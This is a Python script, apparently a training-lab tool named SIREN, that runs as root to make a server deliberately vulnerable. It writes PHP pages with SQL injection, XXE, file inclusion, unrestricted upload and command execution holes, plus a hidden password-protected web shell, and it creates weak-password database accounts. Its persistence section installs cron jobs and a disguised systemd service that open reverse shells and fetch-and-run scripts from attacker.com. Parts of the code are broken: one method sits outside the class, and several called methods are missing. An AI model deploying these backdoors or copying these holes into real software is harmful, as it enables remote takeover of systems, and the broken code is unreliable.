#!/usr/bin/env python3

import os
import sys
import subprocess
import socket
import random
import string
import pwd
import grp
import threading
import logging
from datetime import datetime
from colorama import init, Fore, Style
from flask import Flask, request, render_template_string, send_file
import paramiko
import psutil
import scapy.all as scapy
from Crypto.Cipher import AES
import nmap

# Initialize colorama
init(autoreset=True)

class SIREN:
    def __init__(self):
        self.banner = """
███████╗██╗██████╗ ███████╗███╗   ██╗
██╔════╝██║██╔══██╗██╔════╝████╗  ██║
███████╗██║██████╔╝█████╗  ██╔██╗ ██║
╚════██║██║██╔══██╗██╔══╝  ██║╚██╗██║
███████║██║██║  ██║███████╗██║ ╚████║
╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
   Vulnerable Server Creator v1.0
        """
        
        self.app = Flask(__name__)
        self.setup_logging()
        self.config = self.default_config()
        self.services = {}
        self.backdoors = []
        self.web_root = "/var/www/html"
        self.upload_dir = f"{self.web_root}/uploads"

    def setup_logging(self):
        """Setup logging configuration"""
        log_file = 'siren.log'
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger('siren')
        
        # Also log to console
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        formatter = logging.Formatter('%(levelname)s - %(message)s')
        console.setFormatter(formatter)
        self.logger.addHandler(console)

    def default_config(self):
        """Default configuration settings"""
        return {
            'WEB_VULNERABILITIES': True,
            'NETWORK_VULNERABILITIES': True,
            'SYSTEM_VULNERABILITIES': True,
            'DATABASE_VULNERABILITIES': True,
            'KERNEL_VULNERABILITIES': True,
            'MEMORY_VULNERABILITIES': True,
            'CRYPTO_VULNERABILITIES': True,
            'PERSISTENCE': True,
            'ROOTKIT': True,
            'BACKDOORS': True
        }

    def check_root(self):
        """Check for root privileges"""
        if os.geteuid() != 0:
            self.logger.error("Script must be run as root")
            print(f"{Fore.RED}[!] This script must be run as root")
            sys.exit(1)

    def print_banner(self):
        """Display the SIREN banner"""
        print(f"{Fore.CYAN}{self.banner}")
        print(f"{Fore.RED}[!] WARNING: Creates an EXTREMELY vulnerable system!")
        print(f"{Fore.RED}[!] Use ONLY in isolated lab environments{Style.RESET_ALL}\n")

    def setup_directories(self):
        """Create necessary directories"""
        directories = [
            self.web_root,
            self.upload_dir,
            "/var/siren",
            "/var/siren/backdoors",
            "/opt/siren/utils",
            "/var/siren/webroot",
            "/var/siren/logs",
            "/var/siren/data"
        ]
        
        for directory in directories:
            try:
                os.makedirs(directory, exist_ok=True)
                os.chmod(directory, 0o777)
                self.logger.info(f"Created directory: {directory}")
            except Exception as e:
                self.logger.error(f"Failed to create directory {directory}: {e}")

    def install_dependencies(self):
        """Install required system packages"""
        packages = [
            "apache2", "php", "php-mysql", "mysql-server", 
            "openssh-server", "vsftpd", "gcc", "make",
            "python3-dev", "libssl-dev", "git", "curl",
            "netcat", "nmap", "tcpdump", "wireshark"
        ]
        
        try:
            self.logger.info("Updating package lists...")
            subprocess.run(["apt", "update"], check=True)
            
            self.logger.info("Installing packages...")
            subprocess.run(["apt", "install", "-y"] + packages, check=True)
            
            self.logger.info("Dependencies installed successfully")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to install dependencies: {e}")
            sys.exit(1)

    def setup_web_vulnerabilities(self):
        """Setup vulnerable web applications"""
        self.setup_web_server()
        self.create_upload_vulnerability()
        self.create_sqli_vulnerability()
        self.create_rce_vulnerability()
        self.create_lfi_vulnerability()
        self.create_xxe_vulnerability()
        self.create_backdoor_shell()

    def setup_web_server(self):
        """Configure Apache with vulnerable settings"""
        apache_config = """
ServerTokens Full
ServerSignature On
TraceEnable On

<Directory /var/www/html>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Require all granted
</Directory>
"""
        try:
            with open("/etc/apache2/conf-available/siren.conf", "w") as f:
                f.write(apache_config)
            
            subprocess.run(["a2enconf", "siren"], check=True)
            subprocess.run(["systemctl", "restart", "apache2"], check=True)
            
            self.logger.info("Apache configured successfully")
        except Exception as e:
            self.logger.error(f"Failed to configure Apache: {e}")

    def create_upload_vulnerability(self):
        """Create file upload vulnerability"""
        upload_code = """
<?php
if(isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $name = $file['name'];
    $path = "uploads/" . $name;
    move_uploaded_file($file['tmp_name'], $path);
    echo "File uploaded to: " . $path;
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
"""
        self._write_php_file("upload.php", upload_code)
def create_sqli_vulnerability(self):
        """Create SQL injection vulnerability"""
        sqli_code = """
<?php
$conn = new mysqli('localhost', 'root', 'password123', 'vulndb');
if(isset($_GET['id'])) {
    $id = $_GET['id'];
    $query = "SELECT * FROM users WHERE id = " . $id;
    $result = $conn->query($query);
    while($row = $result->fetch_assoc()) {
        echo "User: " . $row['username'] . "<br>";
        echo "CC: " . $row['credit_card'] . "<br>";
        echo "SSN: " . $row['ssn'] . "<br>";
    }
}
?>
<form method="GET">
    User ID: <input type="text" name="id">
    <input type="submit" value="Search">
</form>
"""
        self._write_php_file("users.php", sqli_code)

    def create_xxe_vulnerability(self):
        """Create XXE vulnerability"""
        xxe_code = """
<?php
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$info = simplexml_import_dom($dom);
echo $info->name;
?>
"""
        self._write_php_file("parser.php", xxe_code)

    def create_lfi_vulnerability(self):
        """Create Local File Inclusion vulnerability"""
        lfi_code = """
<?php
if (isset($_GET['file'])) {
    include($_GET['file']);
}
?>
<form method="GET">
    File to include: <input type="text" name="file">
    <input type="submit" value="Include">
</form>
"""
        self._write_php_file("include.php", lfi_code)

    def create_rce_vulnerability(self):
        """Create Remote Code Execution vulnerability"""
        rce_code = """
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
<form method="GET">
    Command: <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>
"""
        self._write_php_file("cmd.php", rce_code)

    def create_backdoor_shell(self):
        """Create PHP backdoor shell"""
        shell_code = """
<?php
if(isset($_POST['password']) && $_POST['password'] == 'siren123') {
    echo '<pre>';
    if(isset($_POST['cmd'])) {
        system($_POST['cmd']);
    }
    echo '</pre>';
    echo '<form method="POST">
    <input type="hidden" name="password" value="siren123">
    <input type="text" name="cmd" style="width:100%">
    <input type="submit" value="Execute">
    </form>';
} else {
    echo '<form method="POST">
    <input type="password" name="password">
    <input type="submit" value="Login">
    </form>';
}
?>
"""
        self._write_php_file(".backdoor.php", shell_code)

    def setup_db_users(self):
        """Setup vulnerable database users"""
        sql_commands = [
            "CREATE USER 'dbadmin'@'%' IDENTIFIED BY 'dbadmin123';",
            "GRANT ALL PRIVILEGES ON *.* TO 'dbadmin'@'%' WITH GRANT OPTION;",
            "CREATE USER 'backup'@'%' IDENTIFIED BY 'backup123';",
            "GRANT ALL PRIVILEGES ON *.* TO 'backup'@'%';",
            "CREATE USER 'www-data'@'localhost' IDENTIFIED BY 'web123';",
            "GRANT ALL PRIVILEGES ON vulndb.* TO 'www-data'@'localhost';",
            "FLUSH PRIVILEGES;"
        ]

        for command in sql_commands:
            try:
                subprocess.run(["mysql", "-e", command])
                self.logger.info(f"Executed SQL command successfully")
            except Exception as e:
                self.logger.error(f"Failed to execute SQL command: {e}")

    def create_persistence_mechanisms(self):
        """Create various persistence mechanisms"""
        # Cron job backdoors
        cron_jobs = [
            "* * * * * root nc -e /bin/bash attacker.com 4444",
            "*/5 * * * * root curl -s http://attacker.com/update.sh | bash",
            "*/10 * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ]

        for i, job in enumerate(cron_jobs):
            cron_file = f"/etc/cron.d/siren_backdoor_{i}"
            with open(cron_file, "w") as f:
                f.write(job + "\n")
            os.chmod(cron_file, 0o644)

        # Systemd service backdoor
        service_content = """
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -e /bin/bash attacker.com 4446; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
"""
        with open("/etc/systemd/system/monitor.service", "w") as f:
            f.write(service_content)

        subprocess.run(["systemctl", "daemon-reload"])
        subprocess.run(["systemctl", "enable", "monitor.service"])
        subprocess.run(["systemctl", "start", "monitor.service"])

    def _write_php_file(self, filename, content):
        """Helper function to write PHP files"""
        filepath = os.path.join(self.web_root, filename)
        try:
            with open(filepath, "w") as f:
                f.write(content)
            os.chmod(filepath, 0o777)
            self.logger.info(f"Created vulnerable PHP file: {filename}")
        except Exception as e:
            self.logger.error(f"Failed to create PHP file {filename}: {e}")

    def run(self):
        """Main execution function"""
        try:
            self.check_root()
            self.print_banner()
            
            print(f"{Fore.GREEN}[+] Starting SIREN setup...{Style.RESET_ALL}")
            
            self.setup_directories()
            self.install_dependencies()
            self.setup_web_vulnerabilities()
            self.setup_network_vulnerabilities()
            self.setup_system_vulnerabilities()
            self.setup_database_vulnerabilities()
            self.create_persistence_mechanisms()
            self.setup_db_users()
            
            self.show_completion_message()
            
        except Exception as e:
            self.logger.error(f"Error during setup: {str(e)}")
            print(f"{Fore.RED}[!] Setup failed: {str(e)}{Style.RESET_ALL}")
            sys.exit(1)

    def show_completion_message(self):
        """Show completion message with system information"""
        ip = socket.gethostbyname(socket.gethostname())
        
        print(f"\n{Fore.GREEN}[+] SIREN setup completed successfully!{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}=== System Information ==={Style.RESET_ALL}")
        print(f"IP Address: {ip}")
        print("\nVulnerable Services:")
        print(f"- Web Interface: http://{ip}/")
        print(f"- SSH: {ip}:22")
        print(f"- FTP: {ip}:21")
        print(f"- MySQL: {ip}:3306")
        print(f"- Backdoor: {ip}:4444")
        
        print("\nDefault Credentials:")
        print("- MySQL Root: root:password123")
        print("- MySQL Admin: dbadmin:dbadmin123")
        print("- SSH Admin: admin:admin123")
        print("- FTP Anonymous: enabled")
        print("- Backdoor Shell Password: siren123")
        
        print(f"\n{Fore.RED}[!] WARNING: System is now extremely vulnerable!")
        print(f"[!] Use only in isolated lab environments{Style.RESET_ALL}")

if __name__ == "__main__":
    siren = SIREN()
    siren.run()
